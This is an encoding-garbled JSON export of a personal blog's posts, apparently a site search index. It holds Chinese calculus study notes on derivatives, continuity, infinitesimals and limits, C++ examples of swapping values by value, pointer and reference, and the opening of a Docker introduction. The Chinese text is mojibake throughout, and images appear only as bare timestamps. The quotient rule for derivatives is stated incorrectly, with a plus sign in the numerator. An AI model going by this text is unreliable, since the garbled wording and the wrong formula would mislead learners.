æ±‚å¯¼æ³•åˆ™ï¼š(1)$u(x)ã€v(x)$å¯å¯¼ï¼Œ$(u(x)+v(x))â€™=uâ€™(x)+vâ€™(x)$ 1600252000327 (2)$(uv)â€™=uâ€™v+uvâ€™$ 1600252779790 (3)$\\frac{u}{v}=\\frac{uâ€™v+uvâ€™}{v^2}$ 1600253704886 1600253831993 åå‡½æ•°æ±‚å¯¼æ³•åˆ™ï¼š$y=f(x)$ . $x=\\phi(y)$ åå‡½æ•°=å¯¼æ•°çš„å€’æ•° $\\phi(y)=\\frac{1}{fâ€™(x)}$ 1600255372014 1600255541697\" style=\"zoom:50%; å¤åˆå‡½æ•°ï¼šé“¾å¼æ³•åˆ™ï¼š1600256472549 1600257193054 1600257319985 å‰¥æ´‹è‘±è§£æ³•ï¼Œä»å¤–å¾€é‡Œå‰¥ã€‚ 1600257524549 é«˜é˜¶å‡½æ•°1600271203725 å¯¹$y$æ±‚ä¸¤æ¬¡å¯¼æ•°ï¼Œè®°ä½œ$y^{â€˜â€™}$,äºŒé˜¶å¯¼æ•° æˆ–è€…$\\frac{d^2y}{dx^2}$ ä»4é˜¶å¼€å§‹ç”¨æ•°å­—è¡¨ç¤º:$y^{(4)}$ ä¾‹é¢˜ï¼š1600272928789","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"è¿ç»­","slug":"è¿ç»­","date":"2020-09-14T07:53:48.000Z","updated":"2021-04-11T17:11:29.055Z","comments":true,"path":"è¿ç»­/","link":"","permalink":"https://blog.kayleh.top/%E8%BF%9E%E7%BB%AD/","excerpt":"","text":"å¢é‡(æ”¹å˜é‡)1600101409179 â–³xæ˜¯è‡ªå˜é‡çš„å¢é‡ï¼Œâ–³yæ˜¯å› å˜é‡çš„å¢é‡ å®šä¹‰ï¼š f(x)åœ¨$x_0$çš„é‚»åŸŸå†…æœ‰å®šä¹‰ï¼Œ$â–³x\\to 0$,$â–³y\\to 0$ \\lim_{x\\to 0}â–³y=\\lim\\_{x\\to 0} [f(x_0+â–³x)-f(x_0)]=0&amp;æˆ–è€… \\lim_{x\\to x_0} f(x) = f(x_0)é‚£ä¹ˆå°±å«è¿™ä¸ªå‡½æ•°åœ¨è¿™ç‚¹$x_0$ä¸Šæ˜¯è¿ç»­çš„ 1)åœ¨$x_0$å¤„æœ‰å®šä¹‰ 2)$x\\to x_0 f(x)$æœ‰æé™ 3)æé™=åœ¨$x_0$å¤„çš„å®šä¹‰ï¼Œ$f(x_0)$ å·¦è¿ç»­ $(x_0-\\delta,x_0]$1600103890373 åœ¨x_0å¤„è¿ç»­çš„å……è¦æ¡ä»¶æ˜¯æ—¢æ˜¯å·¦è¿ç»­ä¹Ÿæ˜¯å³è¿ç»­ åœ¨åŒºé—´ä¸Šè¿ç»­1600141661421 é—´æ–­ç‚¹è¿ç»­çš„æ¡ä»¶ 1)åœ¨$x_0$å¤„æœ‰å®šä¹‰ 2)$x\\to x_0 f(x)$æœ‰æé™ 3)æé™=å®šä¹‰ æ— ç©·é—´æ–­ åœ¨$x_0$å¤„æ²¡æœ‰å®šä¹‰ 1600142602334 æŒ¯è¡ $x\\to x_0 f(x)$æ²¡æœ‰æé™ 1600142774007 è·³è·ƒ å·¦å³æé™ä¸ç›¸ç­‰ 1600142892062\" style=\"zoom:50%; å¯å» 1600143079362 ç¬¬ä¸€ç±»é—´æ–­ç‚¹ï¼šå·¦å³æé™å‡å­˜åœ¨ï¼Œè·³è·ƒã€å¯å»é—´æ–­ç‚¹ ç¬¬äºŒç±»é—´æ–­ç‚¹ï¼šå·¦å³æé™ä¸å­˜åœ¨ï¼Œæ— ç©·é—´æ–­ã€æŒ¯è¡ ä¾‹é¢˜ï¼š1600144334745 1600144487842 å·¦å³æé™éƒ½å­˜åœ¨ä½†ä¸ç›¸ç­‰ è¿ç®—æ³•åˆ™å››åˆ™è¿ç®— $f(x)Â±g(x).g(x)f(x).\\frac{f(x)}{g(x)} (g(x)â‰ 0)$ ä¾ç„¶è¿ç»­ 1600145522288 ä¾‹é¢˜ï¼š 1600161636813 1600162013682 1600164950987 1600167044079 $f(x)= e^{lnf(x)}$ã€ä¸¤ä¸ªé‡è¦æé™ 1600167548596 é—­åŒºé—´ä¸Šè¿ç»­æ€§è´¨(æœ‰ç•Œæ€§) å¦‚æœåœ¨$[a,b]$ä¸Šæ˜¯è¿ç»­çš„ï¼Œæœ‰ç•Œ (æœ€å€¼æ€§) å¦‚æœåœ¨$[a,b]$ä¸Šæ˜¯è¿ç»­çš„ï¼Œbæœ‰æœ€å¤§æœ€å°å€¼ (ä»‹å€¼æ€§) å¦‚æœåœ¨$[a,b]$ä¸Šæ˜¯è¿ç»­çš„ï¼Œæœ€å°å€¼mï¼Œæœ€å¤§å€¼Mï¼Œä»‹äºmå’ŒMä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå–å€¼ï¼šm&lt;c&lt;M å¿…å­˜åœ¨ä¸€ç‚¹$\\xi$: $f(\\xi)=c$ 1600168581142 é›¶ç‚¹å­˜åœ¨å®šç†[a,b]ä¸Šæ˜¯è¿ç»­çš„ï¼Œf(a)f(b)&lt;0 å¼‚å· åœ¨(a,b)å­˜åœ¨ä¸€ç‚¹$\\xi$ï¼Œ$f(\\xi)=0$ 1600169591606","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"æ— ç©·å°ä¸æ— ç©·å¤§","slug":"æ— ç©·å°ä¸æ— ç©·å¤§","date":"2020-09-12T00:33:41.000Z","updated":"2021-04-11T17:11:28.915Z","comments":true,"path":"æ— ç©·å°ä¸æ— ç©·å¤§/","link":"","permalink":"https://blog.kayleh.top/%E6%97%A0%E7%A9%B7%E5%B0%8F%E4%B8%8E%E6%97%A0%E7%A9%B7%E5%A4%A7/","excerpt":"","text":"æ— ç©·å°é‡å®šä¹‰ï¼šæé™ä¸º0çš„å˜é‡ç§°ä¸ºæ— ç©·å°é‡ï¼Œç®€ç§°æ— ç©·å°. f(x)â†’0 å¸¸ç”¨å¸Œè…Šå­—æ¯ $\\alpha$ ,$\\beta$ ,$\\gamma$ 1599900342394\" style=\"zoom:80%; \\lim_{x\\to0}x^2=0 æé™ä¸º0\\lim_{x\\to1}x^2=1 æé™ä¸º1\\lim_{x\\to\\infty}x^2=0 æé™ä¸º\\inftyå®šç†:1.æ— ç©·å° Ã— æœ‰ç•Œ æ˜¯æ— ç©·å° 1599986185723 1599986310095 å¦ä¸€ä¸ªä¾‹é¢˜ 1599986445115\" style=\"zoom:67%; åˆ†è§£åé¢çš„ardtanxï¼ŒåŠ ä¸Šç»å¯¹å€¼|ardtanx|ï¼Œè¯´æ˜æ˜¯æœ‰ç•Œçš„ã€‚ 1599986528426 2. æ— ç©·å¤§$f(x)-&gt;+\\infty æˆ–-\\infty$ 1)ä¸¤ä¸ªæ— ç©·å¤§ç›¸ä¹˜=æ— ç©·å¤§ 2)æ— ç©·å¤§+æœ‰ç•Œ-&gt;æ— ç©·å¤§ å®šç†ï¼š3. f(x)æ— ç©·å¤§ $\\frac{1}{f(x)}$æ— ç©·å° (åŒä¸€å˜åŒ–è¿‡ç¨‹) f(x)æ— ç©·å° $\\frac{1}{f(x)}$æ— ç©·å°(åŒä¸€å˜åŒ–è¿‡ç¨‹) æé™çš„è¿ç®—æ³•åˆ™å®šç†(å››åˆ™è¿ç®—) è‹¥$\\lim f(x)=a , \\lim g(x)=b$ï¼ˆå‰ææ˜¯æ¯ä¸ªå‡½æ•°æé™å­˜åœ¨,é¡¹æ˜¯æœ‰é™ä¸ªçš„ï¼‰ 1)$\\lim (f(x)+g(x))=\\lim f(x) Â± \\lim g(x)=a Â± b$ 2)$\\lim f(x)g(x)=\\lim f(x) Â· \\lim g(x)$ 3)$\\lim \\frac{f(x)}{g(x)}=\\frac {\\lim f(x)}{\\lim g(x)}(bâ‰ 0)$ å…¶å®å°±æ˜¯æŠŠæé™å¸¦è¿›å» 1599989272603 $\\lim f(x)^n=(\\lim f(x))^n$ ä¾‹å¦‚ï¼š 1599991572302 1599991769614 $\\frac{\\infty}{\\infty}$åˆ†å­ã€åˆ†æ¯åŒæ¬¡ï¼Œæœ€é«˜æ¬¡çš„ç³»æ•°ä¹‹æ¯”ï¼ˆåˆ†å­åˆ†æ¯éƒ½è¶‹äºæ— ç©·ï¼‰ 1599992066326 åˆ†æ¯æ¬¡æ•°é«˜ï¼Œ0 åˆ†å­æ¬¡æ•°é«˜ï¼Œ$\\infty$ åˆ†å­æœ‰ç†åŒ– 1599992521008 æ— é™ä¸ªé¡¹ï¼šå¤šé¡¹å¼$ \\frac{n(a_1+a_n)}{2}$ 1599992622470 1599993150129 =1 1599993401288 æé™å­˜åœ¨å‡†åˆ™ ä¸¤ä¸ªé‡è¦æé™ä¸€ã€å¤¹é€¼å®šç†ï¼šå­˜åœ¨ä¸‰ä¸ªå‡½æ•°f(x).g(x).h(x) 1600002658181 1600003472051 ä¸­é—´çš„ä¸€å †ä¹˜èµ·æ¥å°äº1ï¼Œå½“nè¶‹äºæ— ç©·æ—¶ï¼Œå·¦è¾¹è¶‹äº0ï¼Œå³è¾¹è¶‹äº0 äºŒã€å•è°ƒæœ‰ç•Œæ•°åˆ—å¿…æœ‰æé™ 1600005635112 1600009971627 âˆ´å•è°ƒé€’å¢ ä¸¤ä¸ªé‡è¦æé™\\lim_{x\\to0} \\frac{sinx}{x}=1ä¾‹é¢˜1 1600011716508 1600011741245\" style=\"zoom:67%; ä¾‹é¢˜2 1600011828835 1600012281358\" style=\"zoom:80%; ä¾‹é¢˜3 1600012406004 1600013433140 1600054647972 åˆ©ç”¨åå‡½æ•°ï¼š 1600054832389 é¢˜å‹ï¼š 1600055078141\" style=\"zoom:150%; 1600055150818 1600055302965 1600055402981 1600056574474 1600060254757 æ— ç©·å°çš„æ¯”è¾ƒ$\\lim f(x)=0$ ,$\\lim$ $g(x)=0$ ,$g(x)â‰ 0$ $\\lim \\frac{f(x)}{g(x)}=0$ .$f(x)$æ¯”$g(x)$é«˜é˜¶æ— ç©·å°ï¼Œ$f(x)=o(g(x))$ $\\lim \\frac{f(x)}{g(x)}=\\infty$ .$f(x)$æ¯”$g(x)$ä½é˜¶æ— ç©·å°ï¼Œæ²¡æœ‰ç¬¦å· å¦‚: $x\\to 0$ , $\\frac{x}{x^2}$ ,åˆ†æ¯çš„è¶‹0é€Ÿåº¦æ›´å¿«ï¼Œ $\\frac{1}{x}$ $\\lim \\frac{f(x)}{g(x)}=câ‰ 0$ï¼ŒåŒé˜¶æ— ç©·å°ï¼› å¦‚ï¼š$x&gt;0$ , $\\frac{4x}{2x}=2$ $\\lim \\frac{f(x)}{g(x)}=c=1$ , ç­‰ä»·æ— ç©·å°$f(x)$~$g(x)$ ä¾‹é¢˜ï¼š 1)$ln(1+x)$~$x$ $x\\to0$ 1600086990031 2)$e^x-1$~$x$ 1600087533941 æœ‰ä¸ªç»“è®ºï¼š $a^x-1$~$xlna$ 3)$\\sqrt[n]{1+x}-1$~$\\frac{1}{n}x$ 1600088081673 1600088599482 å¯ä»¥ç›´æ¥ç”¨çš„å…¬å¼ï¼š 1600088819483 $f_1(x)$~$f_2(x)$,$g_1(x)$~$g_2(x)$ , $\\lim \\frac{f_2(x)}{g_2(x)}$å­˜åœ¨æé™ $\\lim \\frac{f_1(x)}{g_1(x)}$ = $\\lim \\frac{f_2(x)}{g_2(x)}$ 1ï¼‰ä¸¤ä¸ªæ— ç©·å°ä¹‹æ¯”æ‰ç”¨ 2ï¼‰åˆ†å­æˆ–åˆ†æ¯æ˜¯å› å­çš„ä¹˜ç§¯ï¼Œé€‰éƒ¨åˆ†å› æ›¿æ¢ $\\frac{(â—)Ã—(â—)Ã—(â– )}{(â—)Ã—(â– )}$ åªä¿ç•™â– ã€‚ ä¾‹é¢˜ï¼š âˆµ $sinx$~$x$ 1600094985483 1600095161294","categories":[{"name":"é«˜æ•°","slug":"é«˜æ•°","permalink":"https://blog.kayleh.top/categories/%E9%AB%98%E6%95%B0/"}],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"æé™","slug":"æé™","date":"2020-09-11T18:30:50.000Z","updated":"2021-04-11T17:11:28.922Z","comments":true,"path":"æé™/","link":"","permalink":"https://blog.kayleh.top/%E6%9E%81%E9%99%90/","excerpt":"","text":"æé™ [â€œæé™â€æ˜¯æ•°å­¦ä¸­çš„åˆ†æ”¯â€”â€”å¾®ç§¯åˆ†çš„åŸºç¡€æ¦‚å¿µï¼Œå¹¿ä¹‰çš„â€œæé™â€æ˜¯æŒ‡â€œæ— é™é è¿‘è€Œæ°¸è¿œä¸èƒ½åˆ°è¾¾â€çš„æ„æ€ã€‚æ•°å­¦ä¸­çš„â€œæé™â€æŒ‡ï¼šæŸä¸€ä¸ªå‡½æ•°ä¸­çš„æŸä¸€ä¸ªå˜é‡ï¼Œæ­¤å˜é‡åœ¨å˜å¤§ï¼ˆæˆ–è€…å˜å°ï¼‰çš„æ°¸è¿œå˜åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œé€æ¸å‘æŸä¸€ä¸ªç¡®å®šçš„æ•°å€¼Aä¸æ–­åœ°é€¼è¿‘è€Œâ€œæ°¸è¿œä¸èƒ½å¤Ÿé‡åˆåˆ°Aâ€ï¼ˆâ€œæ°¸è¿œä¸èƒ½å¤Ÿç­‰äºAï¼Œä½†æ˜¯å–ç­‰äºAâ€˜å·²ç»è¶³å¤Ÿå–å¾—é«˜ç²¾åº¦è®¡ç®—ç»“æœï¼‰çš„è¿‡ç¨‹ä¸­ï¼Œæ­¤å˜é‡çš„å˜åŒ–ï¼Œè¢«äººä¸ºè§„å®šä¸ºâ€œæ°¸è¿œé è¿‘è€Œä¸åœæ­¢â€ã€å…¶æœ‰ä¸€ä¸ªâ€œä¸æ–­åœ°æä¸ºé è¿‘Aç‚¹çš„è¶‹åŠ¿â€ã€‚æé™æ˜¯ä¸€ç§â€œå˜åŒ–çŠ¶æ€â€çš„æè¿°ã€‚æ­¤å˜é‡æ°¸è¿œè¶‹è¿‘çš„å€¼Aå«åšâ€œæé™å€¼â€ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å…¶ä»–ç¬¦å·è¡¨ç¤ºï¼‰ã€‚ è¯æ˜ï¼š1=0.9999Â·Â·Â·Â·Â·ï¼Ÿ 1599927106892 æ¯”å¦‚ å‡è®¾æœ‰ä¸€åœ† 1599879927815 æœ‰å†…æ¥åœ†é¢ç§¯$A_1$ 1599880274448 è®°å†…æ¥åäºŒè¾¹å½¢çš„é¢ç§¯ä¸º$A_2$ 1599880425245 24è¾¹å½¢ 1599880485257 å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ•°åˆ—{$A_n$} æ•°åˆ—çš„æé™å½“nâ†’$\\infty$æ—¶ï¼Œ{$A_n$}ä¹Ÿæ— é™æ¥è¿‘äºæŸä¸€ç¡®å®šçš„æ•°å€¼ï¼Œè¿™ä¸ªæ•°å€¼ç§°ä¸ºæ•°åˆ—{$A_n$}å½“nâ†’$\\infty$æ—¶çš„æé™ã€‚ 1599880801602 1599881076960\" style=\"zoom:80%; 1599928047079 åé¢çš„å€¼éƒ½è½åœ¨è¿™ä¸ªé‚»åŸŸé‡Œé¢ 1599928641478 1599930175659 1599930952171 1599931509911 nä¸€å®šæ˜¯ &gt; ??? è¦æ±‚ $\\lvert x_n -1 \\rvert$=$\\frac{1}{n}$&lt;$\\epsilon$,åªè¦n&gt;[$\\frac{1}{\\epsilon} $],ä»¥åçš„ä¸€åˆ‡é¡¹å‡æ»¡è¶³ $\\lvert x_n -1 \\rvert$&lt;$\\epsilon$. å¯¹äºä»»æ„ç»™å®šçš„æ­£æ•°$\\epsilon$ï¼Œæ€»å­˜åœ¨ç€ä¸€ä¸ªæ­£æ•´æ•°N(æ¯”å¦‚å–N=[$\\frac{1}{\\epsilon}$]),å½“n&gt;Næ—¶ï¼Œ \\lvert x_n -1 \\rvert","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å€¼ä¼ é€’","slug":"å‡½æ•°å’ŒæŒ‡é’ˆ","date":"2020-09-09T21:01:12.000Z","updated":"2021-04-11T17:11:28.627Z","comments":true,"path":"å‡½æ•°å’ŒæŒ‡é’ˆ/","link":"","permalink":"https://blog.kayleh.top/%E5%87%BD%E6%95%B0%E5%92%8C%E6%8C%87%E9%92%88/","excerpt":"","text":"ä¼ å€¼è°ƒç”¨å‘å‡½æ•°ä¼ é€’å‚æ•°çš„ä¼ å€¼è°ƒç”¨æ–¹æ³•ï¼ŒæŠŠå‚æ•°çš„å®é™…å€¼å¤åˆ¶ç»™å‡½æ•°çš„å½¢å¼å‚æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¿®æ”¹å‡½æ•°å†…çš„å½¢å¼å‚æ•°ä¸ä¼šå½±å“å®é™…å‚æ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒC++ ä½¿ç”¨ä¼ å€¼è°ƒç”¨æ–¹æ³•æ¥ä¼ é€’å‚æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™æ„å‘³ç€å‡½æ•°å†…çš„ä»£ç ä¸ä¼šæ”¹å˜ç”¨äºè°ƒç”¨å‡½æ•°çš„å®é™…å‚æ•°ã€‚ #include &lt;iostream&gt; using namespace std; // å‡½æ•°å£°æ˜ void swap(int x, int y); // å‡½æ•°å®šä¹‰ void swap(int x, int y) { int temp; temp = x; /* ä¿å­˜ x çš„å€¼ */ x = y; /* æŠŠ y èµ‹å€¼ç»™ x */ y = temp; /* æŠŠ x èµ‹å€¼ç»™ y */ return; } int main() { // å±€éƒ¨å˜é‡å£°æ˜ int a = 100; int b = 200; cout &lt;&lt; &quot;before swap,a:&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;before swap,b:&quot; &lt;&lt; b &lt;&lt; endl; // è°ƒç”¨å‡½æ•°æ¥äº¤æ¢å€¼ swap(a, b); cout &lt;&lt; &quot;After swap,a:&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;After swap,b:&quot; &lt;&lt; b &lt;&lt; endl; return 0; } æŒ‡é’ˆè°ƒç”¨å‘å‡½æ•°ä¼ é€’å‚æ•°çš„æŒ‡é’ˆè°ƒç”¨æ–¹æ³•ï¼ŒæŠŠå‚æ•°çš„åœ°å€å¤åˆ¶ç»™å½¢å¼å‚æ•°ã€‚åœ¨å‡½æ•°å†…ï¼Œè¯¥åœ°å€ç”¨äºè®¿é—®è°ƒç”¨ä¸­è¦ç”¨åˆ°çš„å®é™…å‚æ•°ã€‚è¿™æ„å‘³ç€ï¼Œä¿®æ”¹å½¢å¼å‚æ•°ä¼šå½±å“å®é™…å‚æ•°ã€‚ æŒ‰æŒ‡é’ˆä¼ é€’å€¼ï¼Œå‚æ•°æŒ‡é’ˆè¢«ä¼ é€’ç»™å‡½æ•°ï¼Œå°±åƒä¼ é€’å…¶ä»–å€¼ç»™å‡½æ•°ä¸€æ ·ã€‚å› æ­¤ç›¸åº”åœ°ï¼Œåœ¨ä¸‹é¢çš„å‡½æ•° swap()ä¸­ï¼Œæ‚¨éœ€è¦å£°æ˜å‡½æ•°å‚æ•°ä¸ºæŒ‡é’ˆç±»å‹ï¼Œè¯¥å‡½æ•°ç”¨äºäº¤æ¢å‚æ•°æ‰€æŒ‡å‘çš„ä¸¤ä¸ªæ•´æ•°å˜é‡çš„å€¼ã€‚ #include &lt;iostream&gt; using namespace std; void swap(int *x, int *y); // å‡½æ•°å®šä¹‰ void swap(int *x, int *y) { int temp; temp = *x; /* ä¿å­˜åœ°å€ x çš„å€¼ */ *x = *y; /* æŠŠ y èµ‹å€¼ç»™ x */ *y = temp; /* æŠŠ x èµ‹å€¼ç»™ y */ return; } int main() { int a = 100; int b = 200; cout &lt;&lt; &quot;before swap,a:&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;before swap,b:&quot; &lt;&lt; b &lt;&lt; endl; /* è°ƒç”¨å‡½æ•°æ¥äº¤æ¢å€¼ * &amp;a è¡¨ç¤ºæŒ‡å‘ a çš„æŒ‡é’ˆï¼Œå³å˜é‡ a çš„åœ°å€ * &amp;b è¡¨ç¤ºæŒ‡å‘ b çš„æŒ‡é’ˆï¼Œå³å˜é‡ b çš„åœ°å€ */ swap(&amp;a, &amp;b); cout &lt;&lt; &quot;After swap,a:&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;After swap,b:&quot; &lt;&lt; b &lt;&lt; endl; return 0; } å¼•ç”¨è°ƒç”¨//å‘å‡½æ•°ä¼ é€’å‚æ•°çš„å¼•ç”¨è°ƒç”¨æ–¹æ³•ï¼ŒæŠŠå¼•ç”¨çš„åœ°å€å¤åˆ¶ç»™å½¢å¼å‚æ•°ã€‚åœ¨å‡½æ•°å†…ï¼Œè¯¥å¼•ç”¨ç”¨äºè®¿é—®è°ƒç”¨ä¸­è¦ç”¨åˆ°çš„å®é™…å‚æ•°ã€‚è¿™æ„å‘³ç€ï¼Œä¿®æ”¹å½¢å¼å‚æ•°ä¼šå½±å“å®é™…å‚æ•°ã€‚//æŒ‰å¼•ç”¨ä¼ é€’å€¼ï¼Œå‚æ•°å¼•ç”¨è¢«ä¼ é€’ç»™å‡½æ•°ï¼Œå°±åƒä¼ é€’å…¶ä»–å€¼ç»™å‡½æ•°ä¸€æ ·ã€‚å› æ­¤ç›¸åº”åœ°ï¼Œ//åœ¨ä¸‹é¢çš„å‡½æ•° swap()ä¸­ï¼Œæ‚¨éœ€è¦å£°æ˜å‡½æ•°å‚æ•°ä¸ºå¼•ç”¨ç±»å‹ï¼Œè¯¥å‡½æ•°ç”¨äºäº¤æ¢å‚æ•°æ‰€æŒ‡å‘çš„ä¸¤ä¸ªæ•´æ•°å˜é‡çš„å€¼ã€‚ #include &lt;iostream&gt; using namespace std; void swap(int &amp;x, int &amp;y); // å‡½æ•°å®šä¹‰ void swap(int &amp;x, int &amp;y) { int temp; temp = x; /* ä¿å­˜åœ°å€ x çš„å€¼ */ x = y; /* æŠŠ y èµ‹å€¼ç»™ x */ y = temp; /* æŠŠ x èµ‹å€¼ç»™ y */ return; } int main() { // å±€éƒ¨å˜é‡å£°æ˜ int a = 100; int b = 200; cout &lt;&lt; &quot;before swap,a:&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;before swap,b:&quot; &lt;&lt; b &lt;&lt; endl; // è°ƒç”¨å‡½æ•°æ¥äº¤æ¢å€¼ swap(a, b); cout &lt;&lt; &quot;After swap,a:&quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;After swap,b:&quot; &lt;&lt; b &lt;&lt; endl; return 0; }","categories":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/categories/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"dockerè™šæ‹ŸåŒ–å®¹å™¨","slug":"dockerè™šæ‹ŸåŒ–å®¹å™¨(ing)","date":"2020-08-28T00:36:20.000Z","updated":"2021-04-11T17:11:28.498Z","comments":true,"path":"dockerè™šæ‹ŸåŒ–å®¹å™¨(ing)/","link":"","permalink":"https://blog.kayleh.top/docker%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AE%B9%E5%99%A8(ing)/","excerpt":"docker","text":"docker ä¸ºä»€ä¹ˆä¼šæœ‰dockerå‡ºç° ä¸€æ¬¾äº§å“ä»å¼€å‘åˆ°ä¸Šçº¿ï¼Œä»æ“ä½œç³»ç»Ÿï¼Œåˆ°è¿è¡Œç¯å¢ƒï¼Œå†åˆ°åº”ç”¨é…ç½®ã€‚ä½œä¸ºå¼€å‘+è¿ç»´ä¹‹é—´çš„åä½œæˆ‘ä»¬éœ€è¦å…³å¿ƒå¾ˆå¤šä¸œè¥¿ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¤šäº’è”ç½‘å…¬å¸éƒ½ä¸å¾—ä¸é¢å¯¹çš„é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯å„ç§ç‰ˆæœ¬çš„è¿­ä»£ä¹‹åï¼Œä¸åŒç‰ˆæœ¬ç¯å¢ƒçš„å…¼å®¹ï¼Œå¯¹è¿ç»´äººå‘˜éƒ½æ˜¯è€ƒéªŒDockerä¹‹æ‰€ä»¥å‘å±•å¦‚æ­¤è¿…é€Ÿï¼Œä¹Ÿæ˜¯å› ä¸ºå®ƒå¯¹æ­¤ç»™å‡ºäº†ä¸€ä¸ªæ ‡å‡†åŒ–çš„è§£å†³æ–¹æ¡ˆã€‚ç¯å¢ƒé…ç½®å¦‚æ­¤éº»çƒ¦ï¼Œæ¢ä¸€å°æœºå™¨ï¼Œå°±è¦é‡æ¥ä¸€æ¬¡ï¼Œè´¹åŠ›è´¹æ—¶ã€‚å¾ˆå¤šäººæƒ³åˆ°ï¼Œèƒ½ä¸èƒ½ä»æ ¹æœ¬ä¸Šè§£å†³é—®é¢˜ï¼Œè½¯ä»¶å¯ä»¥å¸¦ç¯å¢ƒå®‰è£…ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œå®‰è£…çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹ç¯å¢ƒä¸€æ¨¡ä¸€æ ·åœ°å¤åˆ¶è¿‡æ¥ã€‚å¼€å‘äººå‘˜åˆ©ç”¨ Docker å¯ä»¥æ¶ˆé™¤åä½œç¼–ç æ—¶â€œåœ¨æˆ‘çš„æœºå™¨ä¸Šå¯æ­£å¸¸å·¥ä½œâ€çš„é—®é¢˜ã€‚ ä¹‹å‰åœ¨æœåŠ¡å™¨é…ç½®ä¸€ä¸ªåº”ç”¨çš„è¿è¡Œç¯å¢ƒï¼Œè¦å®‰è£…å„ç§è½¯ä»¶ï¼Œå°±æ‹¿å°šç¡…è°·ç”µå•†é¡¹ç›®çš„ç¯å¢ƒæ¥è¯´å§ï¼ŒJava/Tomcat/MySQL/JDBCé©±åŠ¨åŒ…ç­‰ã€‚å®‰è£…å’Œé…ç½®è¿™äº›ä¸œè¥¿æœ‰å¤šéº»çƒ¦å°±ä¸è¯´äº†ï¼Œå®ƒè¿˜ä¸èƒ½è·¨å¹³å°ã€‚å‡å¦‚æˆ‘ä»¬æ˜¯åœ¨ Windows ä¸Šå®‰è£…çš„è¿™äº›ç¯å¢ƒï¼Œåˆ°äº† Linux åˆå¾—é‡æ–°è£…ã€‚å†µä¸”å°±ç®—ä¸è·¨æ“ä½œç³»ç»Ÿï¼Œæ¢å¦ä¸€å°åŒæ ·æ“ä½œç³»ç»Ÿçš„æœåŠ¡å™¨ï¼Œè¦ç§»æ¤åº”ç”¨ä¹Ÿæ˜¯éå¸¸éº»çƒ¦çš„ã€‚ ä¼ ç»Ÿä¸Šè®¤ä¸ºï¼Œè½¯ä»¶ç¼–ç å¼€å‘/æµ‹è¯•ç»“æŸåï¼Œæ‰€äº§å‡ºçš„æˆæœå³æ˜¯ç¨‹åºæˆ–æ˜¯èƒ½å¤Ÿç¼–è¯‘æ‰§è¡Œçš„äºŒè¿›åˆ¶å­—èŠ‚ç ç­‰(javaä¸ºä¾‹)ã€‚è€Œä¸ºäº†è®©è¿™äº›ç¨‹åºå¯ä»¥é¡ºåˆ©æ‰§è¡Œï¼Œå¼€å‘å›¢é˜Ÿä¹Ÿå¾—å‡†å¤‡å®Œæ•´çš„éƒ¨ç½²æ–‡ä»¶ï¼Œè®©ç»´è¿å›¢é˜Ÿå¾—ä»¥éƒ¨ç½²åº”ç”¨ç¨‹å¼ï¼Œå¼€å‘éœ€è¦æ¸…æ¥šçš„å‘Šè¯‰è¿ç»´éƒ¨ç½²å›¢é˜Ÿï¼Œç”¨çš„å…¨éƒ¨é…ç½®æ–‡ä»¶+æ‰€æœ‰è½¯ä»¶ç¯å¢ƒã€‚ä¸è¿‡ï¼Œå³ä¾¿å¦‚æ­¤ï¼Œä»ç„¶å¸¸å¸¸å‘ç”Ÿéƒ¨ç½²å¤±è´¥çš„çŠ¶å†µã€‚Dockeré•œåƒçš„è®¾è®¡ï¼Œä½¿å¾—Dockerå¾—ä»¥æ‰“ç ´è¿‡å»ã€Œç¨‹åºå³åº”ç”¨ã€çš„è§‚å¿µã€‚é€è¿‡é•œåƒ(images)å°†ä½œä¸šç³»ç»Ÿæ ¸å¿ƒé™¤å¤–ï¼Œè¿ä½œåº”ç”¨ç¨‹å¼æ‰€éœ€è¦çš„ç³»ç»Ÿç¯å¢ƒï¼Œç”±ä¸‹è€Œä¸Šæ‰“åŒ…ï¼Œè¾¾åˆ°åº”ç”¨ç¨‹å¼è·¨å¹³å°é—´çš„æ— ç¼æ¥è½¨è¿ä½œã€‚ dockerç†å¿µDockeræ˜¯åŸºäºGoè¯­è¨€å®ç°çš„äº‘å¼€æºé¡¹ç›®ã€‚Dockerçš„ä¸»è¦ç›®æ ‡æ˜¯â€œBuildï¼ŒShip and Run Any App,Anywhereâ€ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡å¯¹åº”ç”¨ç»„ä»¶çš„å°è£…ã€åˆ†å‘ã€éƒ¨ç½²ã€è¿è¡Œç­‰ç”Ÿå‘½å‘¨æœŸçš„ç®¡ç†ï¼Œä½¿ç”¨æˆ·çš„APPï¼ˆå¯ä»¥æ˜¯ä¸€ä¸ªWEBåº”ç”¨æˆ–æ•°æ®åº“åº”ç”¨ç­‰ç­‰ï¼‰åŠå…¶è¿è¡Œç¯å¢ƒèƒ½å¤Ÿåšåˆ°â€œä¸€æ¬¡å°è£…ï¼Œåˆ°å¤„è¿è¡Œâ€ã€‚ 1598604211629 Linux 